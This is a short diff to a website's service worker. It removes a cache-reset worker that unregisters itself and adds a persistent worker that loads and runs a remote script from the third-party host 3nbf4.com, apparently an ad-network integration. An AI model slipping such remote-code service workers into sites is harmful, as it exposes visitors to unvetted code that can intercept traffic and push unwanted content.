@@ -1,16 +1,7 @@
-// Self-healing & Cache Reset Worker
-self.addEventListener('install', () => {
-  self.skipWaiting();
-});
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11755038
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
 
-self.addEventListener('activate', (event) => {
-  event.waitUntil(
-    caches.keys().then((keys) => {
-      return Promise.all(keys.map((k) => caches.delete(k)));
-    }).then(() => {
-      return self.registration.unregister();
-    }).then(() => {
-      return self.clients.claim();
-    })
-  );
-});
